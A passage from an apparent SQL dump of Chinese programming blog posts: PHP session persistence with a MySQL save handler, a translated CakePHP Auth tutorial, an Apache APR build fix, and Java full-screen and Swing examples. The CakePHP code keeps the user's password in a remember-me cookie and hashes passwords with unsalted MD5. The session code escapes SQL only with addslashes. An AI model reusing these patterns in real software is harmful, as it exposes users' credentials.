只要利用永久性的Cookie加上&ldquo;session_id&rdquo;函数，就可以实现永久Session数据保存了！</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; 但是为了方便，我们需要知道服务器设置的&ldquo;session.name&rdquo;，但是一般用户都没有权限查看服务器的php.ini设置，不过PHP提供了一个非常好的函数&ldquo;phpinfo&rdquo;，利用这个可以查看几乎所有的PHP信息！</p>\r\n\r\n<p>------------------------------------------------------------------------------------</p>\r\n\r\n<p>&lt;title&gt;PHP相关信息显示&lt;/title&gt;</p>\r\n\r\n<p>&lt;?phpinfo()?&gt;</p>\r\n\r\n<p>------------------------------------------------------------------------------------</p>\r\n\r\n<p>打开编辑器，输入上面的代码，然后在浏览器中运行这个程序，会见到PHP的相关信息（如图1所示）。其中有一项&ldquo;session.name&rdquo;的参数，这个就是我们需要的服务器&ldquo;session.name&rdquo;，一般是&ldquo;PHPSESSID&rdquo;。</p>\r\n\r\n<p>记下了SessionID的名称后，我们就可以实现永久的Session数据储存了！</p>\r\n\r\n<p>复制代码 代码如下:</p>\r\n\r\n<p>session_start();</p>\r\n\r\n<p>ini_set(&#39;session.save_path&#39;,&#39;/tmp/&#39;);</p>\r\n\r\n<p>//6个钟头</p>\r\n\r\n<p>ini_set(&#39;session.gc_maxlifetime&#39;,21600);</p>\r\n\r\n<p>//保存一天</p>\r\n\r\n<p>$lifeTime = 24 * 3600;</p>\r\n\r\n<p>setcookie(session_name(), session_id(), time() + $lifeTime, &quot;/&quot;);</p>\r\n\r\n<p>后记：</p>\r\n\r\n<p>其实真正的永久储存是不可能的，因为Cookie的保存时间有限，而服务器的空间也有限&hellip;&hellip;但是对于一些需要保存时间比较长的站点，以上方法就已经足够了！</p>\r\n\r\n<p>把session放入mysql的Example:</p>\r\n\r\n<p>数据库里建表：session ( sesskey varchar32 , expiry int11 , value longtext)</p>\r\n\r\n<p>code:</p>\r\n\r\n<p>代码执行前已经连接数据库了。</p>\r\n\r\n<p>复制代码 代码如下:</p>\r\n\r\n<p>define(&#39;STORE_SESSIONS&#39;,&#39;mysql&#39;);</p>\r\n\r\n<p>if (STORE_SESSIONS == &#39;mysql&#39;) {</p>\r\n\r\n<p>if (!$SESS_LIFE = get_cfg_var(&#39;session.gc_maxlifetime&#39;)) {</p>\r\n\r\n<p>$SESS_LIFE = 1440;</p>\r\n\r\n<p>}</p>\r\n\r\n<p>function _sess_open($save_path, $session_name) {</p>\r\n\r\n<p>// 如果没有连接数据库，可以在此执行mysql_pconnect,mysql_select_db</p>\r\n\r\n<p>return true;</p>\r\n\r\n<p>}</p>\r\n\r\n<p>function _sess_close() {</p>\r\n\r\n<p>return true;</p>\r\n\r\n<p>}</p>\r\n\r\n<p>function _sess_read($key) {</p>\r\n\r\n<p>$value_query = mysql_query(&quot;select value from sessions where sesskey = &#39;&quot; .addslashes($key) . &quot;&#39; and expiry &gt; &#39;&quot; . time() . &quot;&#39;&quot;);</p>\r\n\r\n<p>$value = mysql_fetch_array($value_query);</p>\r\n\r\n<p>if (isset($value[&#39;value&#39;])) {</p>\r\n\r\n<p>return $value[&#39;value&#39;];</p>\r\n\r\n<p>}</p>\r\n\r\n<p>return false;</p>\r\n\r\n<p>}</p>\r\n\r\n<p>function _sess_write($key, $val) {</p>\r\n\r\n<p>global $SESS_LIFE;</p>\r\n\r\n<p>$expiry = time() + $SESS_LIFE;</p>\r\n\r\n<p>$value = $val;</p>\r\n\r\n<p>$check_query = mysql_query(&quot;select count(*) as total from sessions where sesskey = &#39;&quot; . addslashes($key) . &quot;&#39;&quot;);</p>\r\n\r\n<p>$check = mysql_fetch_array($check_query);</p>\r\n\r\n<p>if ($check[&#39;total&#39;] &gt; 0) {</p>\r\n\r\n<p>return mysql_query(&quot;update sessions set expiry = &#39;&quot; . addslashes($expiry) . &quot;&#39;, value = &#39;&quot; . addslashes($value) . &quot;&#39; where sesskey = &#39;&quot; . addslashes($key) . &quot;&#39;&quot;);</p>\r\n\r\n<p>} else {</p>\r\n\r\n<p>return mysql_query(&quot;insert into sessions values (&#39;&quot; . addslashes($key) . &quot;&#39;, &#39;&quot; . addslashes($expiry) . &quot;&#39;, &#39;&quot; . addslashes($value) . &quot;&#39;)&quot;);</p>\r\n\r\n<p>}</p>\r\n\r\n<p>}</p>\r\n\r\n<p>function _sess_destroy($key) {</p>\r\n\r\n<p>return mysql_query(&quot;delete from sessions where sesskey = &#39;&quot; . addslashes($key) . &quot;&#39;&quot;);</p>\r\n\r\n<p>}</p>\r\n\r\n<p>function _sess_gc($maxlifetime) {</p>\r\n\r\n<p>mysql_query(&quot;delete from sessions where expiry &lt; &#39;&quot; . time() . &quot;&#39;&quot;);</p>\r\n\r\n<p>return true;</p>\r\n\r\n<p>}</p>\r\n\r\n<p>session_set_save_handler(&#39;_sess_open&#39;, &#39;_sess_close&#39;, &#39;_sess_read&#39;, &#39;_sess_write&#39;, &#39;_sess_destroy&#39;, &#39;_sess_gc&#39;);</p>\r\n\r\n<p>}</p>\r\n\r\n<p>danoo_session_name( &#39;dtvSid&#39; );</p>\r\n\r\n<p>danoo_session_save_path(SESSION_WRITE_DIRECTORY);</p>\r\n\r\n<p>还是有点不明白，open,write那些参数哪里来的。</p>\r\n\r\n<p>修改php.ini配置的两个常用函数：</p>\r\n\r\n<p>get_cfg_var(&#39;session.gc_maxlifetime&#39;) : 取得session.gc_maxlifetime的值</p>\r\n\r\n<p>ini_set(&#39;session.cookie_lifetime&#39;,&#39;0&#39;) : 设置session.cookie_lifetime的值为0。</p>\r\n',0,1437661034,0,0),(42,30,'CakePHP Auth 组件教程+例子','<p>原文：http://www.littlehart.net/atthekeyboard/2007/09/11/a-hopefully-useful-tutorial-for-using-cakephps-auth-component/<br />\r\n原文：http://ertw.com/blog/2007/11/04/a-simple-authentication-system-with-cakephp-12-and-auth-component/</p>\r\n\r\n<p>在 深入学习CakePHP框架时，让我最感到头大的一部分就是Auth组件。现在的问题是没有够用的关于如何使用和配置它的信息。幸运的是，我能通&nbsp; 过CakePHP核心团队的gwoo和Nate得到一些内部信息。除此之外还有一些在不同网站上的零散信息。So，这里我将尝试集中一下那些信息，并向你&nbsp; 展示一些关于如何使用此组件的初级到中级的知识。注意，这些代码是针对1.2.x.x的，而且截止到此文发表时（2007-09-11），Auth&nbsp; 组件的API尚未声明它是100%稳定的。换句话说，如果这些在6个月后不能用了可别怪我。</p>\r\n\r\n<p>So，为了使用这个组件，你需要把它添加到你要使用的控制器的组件列表中。由于我通常需要Auth在我所有的控制器中都可用，我更倾向于把这个添加到 app_controller.php 中。<br />\r\nvar $components = array(&#39;Auth&#39;);<br />\r\nSo, 现在我们要想使用它，我们突然有了很多可以且需要设置的选项。在这个例子里我使用了一个现存项目中的代码。你可以在你需要用到Auth的控制器的beforeFilter()方法中设置这些不同的Auth选项。<br />\r\n$this-&gt;Auth-&gt;fields = array(&#39;username&#39; =&gt; &#39;email&#39;, &#39;password&#39; =&gt; &#39;pasword&#39;);</p>\r\n\r\n<p>默认情况下，Auth 期望你有一个叫做User的模型，模型中有一个 &quot;username&quot; 和 &quot;password&quot; 字段。尽管你可以重新指定这些。</p>\r\n\r\n<p>$this-&gt;Auth-&gt;loginAction&nbsp; = array(&#39;controller&#39; =&gt; &#39;users&#39;, &#39;action&#39; =&gt; &#39;login&#39;);你需要告诉Auth哪个&nbsp; controller/action 对儿用于为用户提供登录表单。<br />\r\n$this-&gt;Auth-&gt;loginRedirect = array(&#39;controller&#39; =&gt; &#39;users&#39;, &#39;action&#39; =&gt; &#39;index&#39;);告诉Auth组件在验证通过后重定向到哪儿。<br />\r\n$this-&gt;Auth-&gt;logoutRedirect = &#39;/&#39;;... 还有当你登出的时候退到哪儿。<br />\r\n$this-&gt;Auth-&gt;loginError = &#39;Invalid e-mail / password combination.&nbsp; Please try again&#39;;你可以指定当验证失败时显示什么错误信息。<br />\r\n$this-&gt;Auth-&gt;autoRedirect&nbsp; =&nbsp; false;有时你不想将通过验证的用户重定向到$this-&gt;Auth-&gt;loginRedirect中指定的位置，因为你需要做一些用户 通过验证后的事情。在这段代码中我用到了这个，它会检查我们是否有一个用于登录的包含用户验证信息的Cookie。<br />\r\nfunction login() {<br />\r\nif ($this-&gt;Auth-&gt;user()) {<br />\r\nif (!empty($this-&gt;data)) {<br />\r\nif (empty($this-&gt;data[&#39;User&#39;][&#39;remember_me&#39;])) {<br />\r\n$this-&gt;Cookie-&gt;del(&#39;User&#39;);<br />\r\n}<br />\r\nelse {<br />\r\n$cookie = array();<br />\r\n$cookie[&#39;email&#39;] = $this-&gt;data[&#39;User&#39;][&#39;email&#39;];<br />\r\n$cookie[&#39;token&#39;] = $this-&gt;data[&#39;User&#39;][&#39;pasword&#39;];<br />\r\n$this-&gt;Cookie-&gt;write(&#39;User&#39;, $cookie, true, &#39;+2 weeks&#39;);<br />\r\n}</p>\r\n\r\n<p>unset($this-&gt;data[&#39;User&#39;][&#39;remember_me&#39;]);<br />\r\n}</p>\r\n\r\n<p>$this-&gt;redirect($this-&gt;Auth-&gt;redirect());<br />\r\n}<br />\r\n}<br />\r\n$this-&gt;Auth-&gt;authorize&nbsp; = &#39;controller&#39;;这&nbsp; 是Auth中新添加的，你可以指定一些关于Auth可以从哪儿获取更多信息的附加信息。通常，Auth会假设你已经使用Cake自己的ACL设置好了一些&nbsp; 东西。我不需要任何像那样复杂的东西，所以我看到我可以绕过它时我感到很高兴。当你设置 $this-&gt;Auth-&gt;authorize&nbsp; 为&quot;controler&quot;&nbsp; 时，你就告诉了Auth组件从一个叫做&ldquo;isAuthorized&rdquo;的动作中获取用户是否已通过验证的更多信息。这里有一个简单的：<br />\r\nfunction isAuthorized() {<br />\r\nif (isset($this-&gt;params[Configure::read(&#39;Routing.admin&#39;)])) {<br />\r\nif ($this-&gt;Auth-&gt;user(&#39;admin&#39;) == 0) {<br />\r\nreturn false;<br />\r\n}<br />\r\n}</p>\r\n\r\n<p>return true;<br />\r\n}<br />\r\n我&nbsp; 假定那个例子是可以自解释的。现在，如果你设置 $this-&gt;Auth-&gt;authorize&nbsp; 为&quot;model&quot;，你就可以在模型中创建一个类似事情的特殊的方法。多谢 AcidMax 在此文中想向你展示如果你用&quot;model&quot;作为&nbsp; $this-&gt;Auth-&gt;authorize 的值时该做些什么。这里也有一个&nbsp; $this-&gt;Auth-&gt;authorize 的 &#39;crud&#39; 选项，但我自己还没用过。你可以使用&nbsp; $this-&gt;Auth-&gt;mapActions 来告诉Auth什么动作映射到了不同的CURD动作上:<br />\r\n$this-&gt;Auth-&gt;mapActions(array(&#39;read&#39;=&gt; array(&#39;display&#39;)));像我所说，我没有傻乐吧唧的围绕着它。 一旦我做了，我会更新这个帖子对它做更多分析。<br />\r\n$this-&gt;Auth-&gt;allow(&#39;add&#39;,&nbsp; &#39;view&#39;);你需要告诉Auth什么动作是可以不经过身份验证即可访问的。&nbsp; 经常困扰初学者的一个问题就是&quot;login&quot;和&quot;logout&quot;已经是Auth知道不需要验证的动作了。如果你把&quot;login&quot;和&quot;logout&quot;放在那 儿，Auth会变得很古怪并且会完全地绕过身份验证。所以，不要那样做。</p>\r\n\r\n<p>现在，这儿还有其他一些对使用Auth的人有用的特性：<br />\r\nfunction logout() {<br />\r\n$this-&gt;Session-&gt;setFlash(&quot;You&#39;ve successfully logged out.&quot;);<br />\r\n$this-&gt;redirect($this-&gt;Auth-&gt;logout());<br />\r\n}$this-&gt;Auth-&gt;logout 将会返回你告诉Auth的那个你想让人们在他们登出后被送往的URL。<br />\r\n$userId = $this-&gt;Auth-&gt;user(&#39;id&#39;);<br />\r\n用户验证通过后你可以从User模型中提取用户信息。User模型中的任何字段你都可以得到。像这样做不是很好吗：<br />\r\nif ($this-&gt;Auth-&gt;user(&#39;admin&#39;) == true) {<br />\r\n$this-&gt;Session-&gt;setFlash(&#39;You are an admin&#39;);<br />\r\n}</p>\r\n\r\n<p>~。&nbsp;&nbsp; 这是很多在你使用Auth构建应用时需要尝试和记在你脑袋中的东西。但还不止这些。Auth组件会自动加密你放在&quot;password&quot;表单域中的值。它会&nbsp;&nbsp; 在你登录和&hellip;&hellip;当你在User模型中创建一条新记录时都这样做。所以你需要确保你表中保存密码的字段有足够的长度可以接受加密后的密码。如果你需要在密码&nbsp; 保存之前做一些事情，你可以通过使用$this-&gt;Auth-&gt;password(&quot;要保存的密码&quot;);来获得需要保持的值。</p>\r\n\r\n<p>无论怎样，我肯定我漏掉了一些其他的深层的东西，但我希望我已经在想你展示Auth组件是多么容易上做的不错了, 当你懂得它实际是怎样工作的时候。</p>\r\n\r\n<p>最后完整这么个系统：</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; 默认需要用户使用一个用户名（E-mail）和一个密码登录；</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; 游客尝试访问受保护的资源会被重定向到登录界面；</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; 控制器可以决定哪些方法需要保护，哪些不需要；</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; 支持基本的分组 &mdash;&mdash; 注册的用户为&ldquo;users&rdquo;，管理员为&ldquo;admin&rdquo;。控制器通过这个字符串完成其他的事情；</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; 它很容易理解，而且不需要在每个控制器中有许多代码。</p>\r\n\r\n<p>开始了，首先，我需要一个用户模型：<br />\r\nCREATE TABLE `users` (</p>\r\n\r\n<p>`id` int(11) NOT NULL auto_increment,</p>\r\n\r\n<p>`email` varchar(255) NOT NULL,</p>\r\n\r\n<p>`password` char(32) NOT NULL,</p>\r\n\r\n<p>`role` varchar(20) NOT NULL default &#39;user&#39;,</p>\r\n\r\n<p>`created` datetime default NULL,</p>\r\n\r\n<p>`modified` datetime default NULL,</p>\r\n\r\n<p>PRIMARY KEY&nbsp; (`id`)</p>\r\n\r\n<p>) ENGINE=MyISAM DEFAULT CHARSET=latin1;</p>\r\n\r\n<p>相应的模型代码（user.php）就是：<br />\r\nclass User extends AppModel {</p>\r\n\r\n<p>var $name = &#39;User&#39;;</p>\r\n\r\n<p>var $validate = array(</p>\r\n\r\n<p>&#39;email&#39; =&gt; VALID_NOT_EMPTY,</p>\r\n\r\n<p>&#39;password&#39; =&gt; VALID_NOT_EMPTY</p>\r\n\r\n<p>);</p>\r\n\r\n<p>function beforeSave() {</p>\r\n\r\n<p>if ($this-&gt;data[&#39;User&#39;][&#39;password&#39;]) {</p>\r\n\r\n<p>$this-&gt;data[&#39;User&#39;][&#39;password&#39;] = md5($this-&gt;data[&#39;User&#39;][&#39;password&#39;]);</p>\r\n\r\n<p>}</p>\r\n\r\n<p>return true;</p>\r\n\r\n<p>}</p>\r\n\r\n<p>}<br />\r\n作为保存在数据库中的密码，它已被自动MD5过了。</p>\r\n\r\n<p>因为我想在每个页面中都有验证（有例外），它在 cake/app_controller.php 中的 beforeFilter 钩子中完成了:<br />\r\nclass AppController extends Controller {</p>\r\n\r\n<p>var $components = array(&quot;Auth&quot;);</p>\r\n\r\n<p>function beforeFilter() {</p>\r\n\r\n<p>// 处理用户验证过滤器</p>\r\n\r\n<p>// 这儿，直接不用config中的salt了。</p>\r\n\r\n<p>// md5 密码会在user模型中用到。</p>\r\n\r\n<p>Security::setHash(&quot;md5&quot;);</p>\r\n\r\n<p>$this-&gt;Auth-&gt;fields = array(&#39;username&#39; =&gt; &#39;email&#39;, &#39;password&#39; =&gt; &#39;password&#39;);</p>\r\n\r\n<p>$this-&gt;Auth-&gt;loginAction = array(&#39;controller&#39; =&gt; &#39;users&#39;, &#39;action&#39; =&gt; &#39;login&#39;);</p>\r\n\r\n<p>$this-&gt;Auth-&gt;loginRedirect = array(&#39;controller&#39; =&gt; &#39;users&#39;, &#39;action&#39; =&gt; &#39;myprofile&#39;);</p>\r\n\r\n<p>$this-&gt;Auth-&gt;logoutRedirect = &#39;/&#39;;</p>\r\n\r\n<p>$this-&gt;Auth-&gt;loginError = &#39;Invalid e-mail / password combination.&nbsp; Please try again&#39;;</p>\r\n\r\n<p>$this-&gt;Auth-&gt;authorize = &#39;controller&#39;;</p>\r\n\r\n<p>}</p>\r\n\r\n<p>各&nbsp; $this-&gt;Auth&nbsp; 行定义了不同的行为，例如登录页面是什么。为&ldquo;controller&rdquo;设置&ldquo;authorize&rdquo;意味着每个控制器必须有一个&nbsp; isAuthorized()&nbsp; 函数，它将根据已验证的用户是否有执行此操作的权利返回true或false。密钥设置为使用MD5加密，因为默认的是SHA1而且这个无法用于我之前建&nbsp; 好的模型里。你也必须编辑你的config文件来移除salt。</p>\r\n\r\n<p>设置好这些后，所有的页面将需要身份验证。要修复这个，在你想要开放权限的控制器中，添加一个beforeFilter：<br />\r\nfunction beforeFilter() {</p>\r\n\r\n<p>$this-&gt;Auth-&gt;allow(&quot;*&quot;);</p>\r\n\r\n<p>parent::beforeFilter();</p>\r\n\r\n<p>}</p>\r\n\r\n<p>这 将允许控制器中所有的动作（Action）无需验证即可通过。allow() 看起来是接受一个不需要身份验证的动作列表，*&nbsp; 的意思是所有。如果只有几个动作需要验证，我会用 $this-&gt;Auth-&gt;allow(&quot;view&quot;, &quot;foo&quot;)&nbsp; 来允许开启view和foo动作的权限。</p>\r\n\r\n<p>如果你需要查看已登录的用户，使用$this-&gt;Auth-&gt;user()，它会返回 一个模型。从那儿我可以得到 权限/分组（role/group） ，或者我放在那儿的其他东西。看起来你并不能在beforeFilter中&nbsp; set() 变量到视图，所以如果你想让视图有用户模型的一部分你应该在其他位置set()。</p>\r\n\r\n<p>对于我的登录函数，我直接从这个教程（也翻译了，在这儿）里偷过来了。（实际上我做的多数都是基于那个教程的，我的贡献只是对MD5相关事宜和allow()的解释(后者我发现已经在他的教程里了，只是被埋到了另一个章节里)）。<br />\r\nif ($this-&gt;Auth-&gt;user()) {</p>\r\n\r\n<p>if (!empty($this-&gt;data)) {</p>\r\n\r\n<p>if (empty($this-&gt;data[&#39;User&#39;][&#39;remember_me&#39;])) {</p>\r\n\r\n<p>$this-&gt;Cookie-&gt;del(&#39;User&#39;);</p>\r\n\r\n<p>} else {</p>\r\n\r\n<p>$cookie = array();</p>\r\n\r\n<p>$cookie[&#39;email&#39;] = $this-&gt;data[&#39;User&#39;][&#39;email&#39;];</p>\r\n\r\n<p>$cookie[&#39;token&#39;] = $this-&gt;data[&#39;User&#39;][&#39;pasword&#39;];</p>\r\n\r\n<p>$this-&gt;Cookie-&gt;write(&#39;User&#39;, $cookie, true, &#39;+2 weeks&#39;);</p>\r\n\r\n<p>}</p>\r\n\r\n<p>unset($this-&gt;data[&#39;User&#39;][&#39;remember_me&#39;]);</p>\r\n\r\n<p>}</p>\r\n\r\n<p>$this-&gt;redirect($this-&gt;Auth-&gt;redirect());</p>\r\n\r\n<p>}</p>\r\n\r\n<p>剩余的代码简单死了，就是一个用于添加账户的注册动作，和一个调用 $this-&gt;Auth-&gt;logout() 的登出动作。</p>\r\n',0,1437661192,0,0),(43,15,'解决编译Apache出现的问题：configure: error: APR not found . Please read the documentation','<p>今日编译apache时出错：</p>\r\n\r\n<p>#./configure --prefix&hellip;&hellip;检查编辑环境时出现：</p>\r\n\r\n<p>checking for APR... no<br />\r\nconfigure: error: APR not found .&nbsp; Please read the documentation</p>\r\n\r\n<p>解决办法：</p>\r\n\r\n<p>1.下载所需软件包：</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; wget http://archive.apache.org/dist/apr/apr-1.4.5.tar.gz &nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; wget http://archive.apache.org/dist/apr/apr-util-1.3.12.tar.gz &nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; wget http://jaist.dl.sourceforge.net/project/pcre/pcre/8.10/pcre-8.10.zip&nbsp; &nbsp;</p>\r\n\r\n<p>2.编译安装：</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; yum remove apr-util-devel apr apr-util-mysql apr-docs apr-devel apr-util apr-util-docs</p>\r\n\r\n<p>具体步骤如下:</p>\r\n\r\n<p>&nbsp; a:解决apr not found问题&gt;&gt;&gt;&gt;&gt;&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; [root@xt test]# tar -zxf apr-1.4.5.tar.gz &nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; [root@xt test]# cd&nbsp; apr-1.4.5 &nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; [root@xt apr-1.4.5]# ./configure --prefix=/usr/local/apr &nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; [root@xt apr-1.4.5]# make &amp;&amp; make install &nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; &nbsp;</p>\r\n\r\n<p>&nbsp; b:解决APR-util not found问题&gt;&gt;&gt;&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; [root@xt test]# tar -zxf apr-util-1.3.12.tar.gz &nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; [root@xt test]# cd apr-util-1.3.12 &nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; [root@xt apr-util-1.3.12]# ./configure --prefix=/usr/local/apr-util -with- apr=/usr/local/apr/bin/apr-1-config &nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; [root@xt apr-util-1.3.12]# make &amp;&amp; make install</p>\r\n\r\n<p><br />\r\n&nbsp; c:解决pcre问题&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; [root@xt test]#unzip -o pcre-8.10.zip &nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; [root@xt test]#cd pcre-8.10 &nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; [root@xt pcre-8.10]#./configure --prefix=/usr/local/pcre &nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; [root@xt pcre-8.10]#make &amp;&amp; make install</p>\r\n\r\n<p>4.最后编译Apache时加上：</p>\r\n\r\n<p>--with-apr=/usr/local/apr \\</p>\r\n\r\n<p>--with-apr-util=/usr/local/apr-util/ \\</p>\r\n\r\n<p>&nbsp;--with-pcre=/usr/local/pcre</p>\r\n\r\n<p>成功编译完成~</p>\r\n',0,1437661302,0,0),(44,16,'Java使用全屏幕模式','<p>什么时候会用到全屏幕模式？</p>\r\n\r\n<p>也许用到的机会很少，但JDK还是为我们提供了这个的功能。像许多软件中的打印预览功能，还有某些文本编辑器中为了获得更大的编辑画面，也用到了全屏幕模式，如果你有兴趣写一个像ACDSee这样的软件，使用全屏幕模式可以让用户看到更大的图片画面。</p>\r\n\r\n<p>如何使用全屏幕模式？</p>\r\n\r\n<p>关键是java.awt.*里面的两个与显示设备有关的类：GraphicsEnvironment和GraphicsDevice。</p>\r\n\r\n<p>GraphicsEnvironment为Java应用程序提供了特定平台的 GraphicsDevice 对象和 Font 对象集合。这些GraphicsDevice可以是各种本机和远端机器的资源，如屏幕、打印机或者是Image Buffer,甚至是Graphics2D绘图方法的目标对象。</p>\r\n\r\n<p>而GraphicsDevice就是指特定的图形环境了，如屏幕和打印设备等。这样，我们就可以用GraphicsDevice来操纵屏幕了。GraphicsDevice提供的setFullScreenWindow()方法就是设置全屏幕用的。</p>\r\n\r\n<p>由于GraphicsEnvironment的构造器是受保护的(protected)，我们不能直接构造一个GraphicsEnvironment对象来获得GraphicsDevice对象。幸好它提供了getLocalGraphicsEnvironment()方法，用来获得一个GraphicsEnvironment实例：</p>\r\n\r\n<p>GraphicsEnvironment ge = GraphicsEnvironment.getLocalGraphicsEnvironment();</p>\r\n\r\n<p>有了GraphicsEnvironment可以调用getDefaultScreenDevice方法获得当前的屏幕设备了：</p>\r\n\r\n<p>GraphicsDevice gd = ge.getDefaultScreenDevice();</p>\r\n\r\n<p>自己动手体验一下</p>\r\n\r\n<p>有了上面的简介，写一个实例来体验一下吧：</p>\r\n\r\n<p>import java.awt.*;<br />\r\nimport java.awt.event.*;<br />\r\nimport javax.swing.*;</p>\r\n\r\n<p>public class FullScreenTest<br />\r\n{<br />\r\npublic static void main(String[] args)<br />\r\n{<br />\r\nGraphicsEnvironment ge = GraphicsEnvironment.getLocalGraphicsEnvironment();<br />\r\nGraphicsDevice gd = ge.getDefaultScreenDevice();<br />\r\nFullScreenWindow myWindow = new FullScreenWindow();<br />\r\nif ( gd.isFullScreenSupported() )<br />\r\ngd.setFullScreenWindow(myWindow);<br />\r\nelse<br />\r\nSystem.out.println(&quot;Unsupported full screen.&quot;);<br />\r\n}<br />\r\n}</p>\r\n\r\n<p>class FullScreenWindow extends JWindow<br />\r\n{<br />\r\npublic FullScreenWindow()<br />\r\n{<br />\r\nthis.addMouseListener(new MouseAdapter()<br />\r\n{<br />\r\npublic void mousePressed(MouseEvent evt)<br />\r\n{<br />\r\nquit();<br />\r\n}<br />\r\n});<br />\r\n}</p>\r\n\r\n<p>public void quit()<br />\r\n{<br />\r\nthis.dispose();<br />\r\n}</p>\r\n\r\n<p>public void paint(Graphics g)<br />\r\n{<br />\r\ng.setFont(new Font(&quot;Arial&quot;,Font.BOLD,30));<br />\r\ng.setColor(Color.RED);<br />\r\ng.drawString(&quot;这是全屏幕模式&quot;,100,100);<br />\r\n}<br />\r\n}</p>\r\n',0,1437661449,0,0),(45,16,'java GUI 组件全演示','<p>一 抛砖引玉</p>\r\n\r\n<p><br />\r\n本文指在利用一个小程序&rdquo;Swing 组件大全&rdquo;来引导大家学习Java这门语言，熟悉Java&nbsp; Swing的各个组件。并在学习过程中参考作者设计这一程序的方法和思想，最终形成自己的思维方式和学习方式。你能举一返三是作者最开心的事情。小程序演 示了Java Swing大部分组件。最后附上了全部代码及详细的注释说明。希望本文能对大家学习Java有所帮助。</p>\r\n\r\n<p><br />\r\n随着Java风潮席卷国内，学习Java的方法和路径越来越多。而在大量的书本前，在Java庞大的类库前大大家都有点迷失方向的感觉，是学 J2EE,J2ME还是。。。。。。然而所有的这些都或多或少的离不开J2SE。万丈高楼平地起。J2SE是整个Java的基础，学好了这个对Java的 各个方向都是很有利的。而学习J2SE的最初点就在界面设计，因为界面编程是你来感觉最直接的手段，是提高大家编程兴趣的很好开始，因为你写完程序编译后 可马上看到自己的成果。而不像后台编程做完了都感受不到效果。而好的界面也是你测试你其他程序的基础。</p>\r\n\r\n<p><br />\r\n界面设 计！不就是拖拉操作吗？如果是VB,VC等可视化的编程，的确只是一些拖拉操作，由于Java语言的设计中所有的东西都是程序代码，在Java中如果想要 设计一个好的界面，可不是简单的拖拉操作能完成的。即使使用了如JBuilder这么强大的可视化工具，你也得亲自动手写一些界面设计代码才能很好的完成 你的任务。如果你能在此基础上理解Java界面设计的思想，对你学习这门语言将有莫大的帮助。</p>\r\n\r\n<p><br />\r\nJava界面设计主要涉及Awt,Swing两大类库，Swing是Awt的扩展和功能加强。下面我们就以Swing为基础来说说整个Java的界面设计。</p>\r\n\r\n<p><br />\r\n二 感受效果</p>\r\n\r\n<p><br />\r\n在开始之前，让我们看看这篇文章要达到的效果，有了目标和成果才有学习的兴趣，起码我是这样认为和学习的。如下图所示,这就是我们设计的界面，它包括了 Swing中大部分常用的组件。有些功能界面上反映不出来，大家可尝试编译源代码点南击各个部分，看看它们的响应事件。</p>\r\n\r\n<p><br />\r\n三 设计思想和方法</p>\r\n\r\n<p><br />\r\n不知道大家（一般是初学者）在看编程书籍的时候有这种体会没有：在看的过程中，好像大部理解了，并且效率还不错，可是回头来要自己写个和书上一样的程序 出来，可能不少人只有重新拿书照打的了；有些人在照书上打过了一遍，也似乎理解了。可回头来真正到用的时候，好像又不记得了。作者本人在初学编程时就经历 过很多次这种情况。</p>\r\n\r\n<p><br />\r\n追其原因，无外乎没有融会贯通所学的知识，编程最讲求动手二字，动手的真正意义在于写自己所想所领会的程序而不是copy现成的程序。因为只有经过自己思考，设计才能把书上的知识真正溶入自己的大脑。下面我们以&rdquo;Swing 组件大全&rdquo;来说说这个方法和思想。</p>\r\n\r\n<p><br />\r\n在看完书上介绍的Swing组件这章后，我心中对Swing大概有了个了解，只差动手了。而本人又不想照书上的例子一个个来试。于是就想到了做个程序把书上介绍的所有组件放到一个界面来，并尝试用到书上介绍的所有方法。</p>\r\n\r\n<p><br />\r\n砍柴不误磨刀功！在开始这前，我手画了一份设计图纸，如上面界面所示（当然没那么漂亮了）。并用简单的软件工程思想对结构进行了大概的划分。这里把整个 界面划分为一个主模块和五大子模块。所有的子模块都是继承至相应的容器，主模块SwingTest既是管理模块也是主界面，继承JFrame主框架，管理 本身的属性及JFrame上的其他子模块。MenuTest子模块继承至JmenuBar负责菜单的显示和事件处理。其他子模块继承至JPanel，管理 放置在其上的组件的布局和显示。从子模块的名字大家也可看到他们的位置和功能。在编写程序前想好结构和思路是个很好的习惯，它将会帮你大大减少工作量，提 高程序的可读性和效率。</p>\r\n\r\n<p><br />\r\n四 容器，布局管理器，嵌板</p>\r\n\r\n<p><br />\r\nSwing中所有的组件都是放到容 器中，主要的容器包括：JFrame,JPanel,JWindow,JDialog,JPanle。JFrame是java的主框架，几乎所有的 Java应用程序界面都是在主框架之中设计的。有些容器并非一层，而由几层嵌板组成,本文将会用到其中在个：拆分嵌板(JSplitPane),内容嵌 板, 页签式嵌板(TabbedPane)</p>\r\n\r\n<p><br />\r\n拆分嵌板：按指定的方向和方式拆分其内的两个子组件，记住一个拆分嵌板只能拆分两个子组件，如果想要拆分三个，大家自己先想一想办法。本节最后给出了答案。</p>\r\n\r\n<p><br />\r\n内容嵌板： 